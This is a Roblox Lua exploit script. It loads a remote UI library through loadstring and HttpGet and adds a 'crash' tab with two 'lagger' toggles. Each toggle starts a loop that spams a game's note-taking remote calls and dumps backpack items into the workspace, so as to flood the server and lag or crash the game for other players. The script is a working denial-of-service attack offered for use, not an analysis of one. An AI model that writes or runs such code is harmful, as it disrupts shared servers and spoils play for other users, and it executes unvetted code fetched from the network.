local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({Name = "Title of the library", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

getgenv().harder = false
getgenv().lag = false

local Stepped = game.RunService.Stepped -- fast loop that ignore the render check process

function fart()
Stepped:Connect(function()
        while getgenv().lag do
            task.wait()
            local args = {
               [1] = "note",
               [2] = Enum.Font.PatrickHand,
               [3] = "\255"
            }
            
            game:GetService("ReplicatedStorage").COM.Game.RequestTakeNote:InvokeServer(unpack(args))
            for i,v in  pairs(game.Players.LocalPlayer.Backpack:GetDescendants()) do
                v.Parent = game.Workspace    
            end
        end
    end)
end

function harder()
    Stepped:Connect(function()
       while getgenv().harder do
            task.wait()
        	 local args = {
                       [1] = "note",
                       [2] = Enum.Font.PatrickHand,
                       [3] = "\255"
                    }
                    
                    game:GetService("ReplicatedStorage").COM.Game.RequestTakeNote:InvokeServer(unpack(args))
    	        wait()
        	local v1 = "Drop"
        	local event = game:GetService("Players").LocalPlayer.Character.Note.ClassEvent
        	event:FireServer(v1)
       end
   end)
end	
	
local Tab = Window:MakeTab({
	Name = "crash",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddToggle({
	Name = "normal lagger",
	Default = false,
	Callback = function(Value)
	    getgenv().lag = Value
	    fart()
	end    
})

Tab:AddToggle({
	Name = "strong PC lagger",
	Default = false,
	Callback = function(Value)
	    getgenv().harder = Value
	    harder()
	end    
})

